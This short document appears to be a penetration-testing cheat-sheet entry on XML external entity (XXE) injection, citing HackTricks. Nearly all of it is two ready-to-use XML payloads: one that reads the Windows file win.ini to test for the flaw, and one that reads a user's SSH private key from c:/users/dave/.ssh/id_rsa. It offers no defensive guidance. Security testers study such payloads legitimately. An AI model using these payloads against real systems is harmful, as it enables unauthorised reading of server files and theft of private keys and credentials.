## XXE / XEE

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

Sample payload for testing whether it's possible

```bash
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY toreplace SYSTEM 'file:///c:/windows/win.ini'> ]>
<order>
    <quantity>1234</quantity>
    <item>&toreplace;</item>
    <address>1234533453</address>
</order>
```

## Common attack vectors

```bash
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY toreplace SYSTEM 'file:///c:/users/dave/.ssh/id_rsa'> ]>
<order>
    <quantity>1234</quantity>
    <item>&toreplace;</item>
    <address>1234533453</address>
</order>
```